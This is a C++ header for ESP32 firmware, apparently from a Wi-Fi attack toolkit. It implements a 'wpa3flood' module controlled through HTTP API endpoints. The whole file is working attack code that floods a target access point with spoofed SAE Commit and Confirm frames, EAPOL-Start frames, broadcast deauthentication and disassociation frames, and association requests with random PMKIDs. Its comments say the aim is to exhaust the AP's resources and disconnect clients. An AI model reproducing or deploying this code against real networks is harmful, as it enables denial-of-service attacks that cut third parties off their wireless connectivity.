#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// WPA3/SAE flood: send SAE Commit frames to exhaust AP state machine
// Also sends SAE Confirm frames to confuse half-open sessions
// Works against WPA3-Personal and WPA3-Transition mode APs
static bool w3_running = false;
static uint8_t w3_bssid[6] = {0};
static uint8_t w3_ch = 6;
static volatile uint32_t w3_sent = 0;
// 0=commit, 1=confirm, 2=both, 3=eap_start, 4=transition_deauth, 5=pmkid_exhaust
static uint8_t w3_mode = 0;
static TaskHandle_t w3_task = nullptr;

static void w3_run(void*) {
  uint8_t f[128]; uint8_t sta[6];
  w3_sent = 0;
  while (w3_running) {
    if (!safety_rate_ok(1)) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
    for (int k = 0; k < 6; k++) sta[k] = esp_random() & 0xFF;
    sta[0] = (sta[0] & 0xFC) | 0x02;
    size_t n = 0;
    switch (w3_mode) {
      case 0:
        n = f_saeCommit(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        break;
      case 1:
        n = f_saeConfirm(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        break;
      case 2:
        n = f_saeCommit(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        n = f_saeConfirm(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        break;
      case 3: // EAP start flood (EAP-based WPA Enterprise)
        n = f_eapolStart(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        break;
      case 4: // Transition-mode deauth — sends unprotected deauth+disassoc
        // WPA3-Transition mode must still accept unprotected frames from WPA2 STAs.
        // This kicks WPA2 clients that may be connected to a mixed-mode AP.
        n = f_deauth(f, BC, w3_bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        n = f_disassoc(f, BC, w3_bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        // Also send SAE commit to pressure pure WPA3 clients
        n = f_saeCommit(f, sta, w3_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        break;
      case 5: // PMKID Exhaust — flood assoc requests with RSN PMKID fields
        // Forces AP to verify PMKID for each random STA → CPU exhaustion
        {
          size_t pp = 0;
          fhdr(f, 0x00, 0x00, w3_bssid, sta, w3_bssid);
          pp = 24;
          f[pp++]=0x11; f[pp++]=0x04; f[pp++]=0x0a; f[pp++]=0x00; // cap+listen
          f[pp++]=0; f[pp++]=0; // SSID IE: empty
          f[pp++]=1; f[pp++]=8; // rates
          { static const uint8_t R[]={0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
            memcpy(f+pp,R,8); pp+=8; }
          // RSN IE with PMKID count=1 and random PMKID
          f[pp++]=0x30; f[pp++]=0x1a; f[pp++]=0x01; f[pp++]=0x00; // RSN
          f[pp++]=0x00; f[pp++]=0x0f; f[pp++]=0xac; f[pp++]=0x04; // group: CCMP
          f[pp++]=0x01; f[pp++]=0x00; f[pp++]=0x00; f[pp++]=0x0f;
          f[pp++]=0xac; f[pp++]=0x04; // pairwise: CCMP
          f[pp++]=0x01; f[pp++]=0x00; f[pp++]=0x00; f[pp++]=0x0f;
          f[pp++]=0xac; f[pp++]=0x08; // SAE AKM
          f[pp++]=0xc0; f[pp++]=0x00; // MFPC+MFPR
          f[pp++]=0x01; f[pp++]=0x00; // PMKID count = 1
          for (int r = 0; r < 16; r++) f[pp++] = esp_random() & 0xFF; // random PMKID
          n = pp;
          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); w3_sent++;
        }
        break;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  w3_task = nullptr; vTaskDelete(nullptr);
}

static bool w3_start(const String& q) {
  int i; String bs, ch, mo;
  if ((i = q.indexOf("bssid=")) >= 0) { int e = q.indexOf('&',i); bs = q.substring(i+6,e<0?q.length():e); }
  if ((i = q.indexOf("ch="))    >= 0) { int e = q.indexOf('&',i); ch = q.substring(i+3,e<0?q.length():e); }
  if ((i = q.indexOf("mode="))  >= 0) { int e = q.indexOf('&',i); mo = q.substring(i+5,e<0?q.length():e); }
  if (bs.length() != 17) return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x",
    (unsigned*)&w3_bssid[0],(unsigned*)&w3_bssid[1],(unsigned*)&w3_bssid[2],
    (unsigned*)&w3_bssid[3],(unsigned*)&w3_bssid[4],(unsigned*)&w3_bssid[5]);
  w3_ch = ch.toInt(); if (!w3_ch) w3_ch = 6;
  if      (mo == "confirm")    w3_mode = 1;
  else if (mo == "both")       w3_mode = 2;
  else if (mo == "eapstart")   w3_mode = 3;
  else if (mo == "transition") w3_mode = 4;
  else if (mo == "pmkid")      w3_mode = 5;
  else                         w3_mode = 0;
  esp_wifi_set_channel(w3_ch, WIFI_SECOND_CHAN_NONE);
  w3_running = true; w3_sent = 0;
  xTaskCreate(w3_run, "w3_run", 4096, nullptr, 5, &w3_task);
  return true;
}
static void w3_stop() { w3_running = false; }
static void w3_routes() {
  extern WebServer server;
  server.on("/api/wpa3flood/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("wpa3flood", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/wpa3flood/stop", HTTP_POST, [](){
    tool_stop("wpa3flood"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/wpa3flood/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(w3_running?1:0)+
      ",\"sent\":"+String(w3_sent)+
      ",\"msg\":\"sent "+String(w3_sent)+"\"}");
  });
}
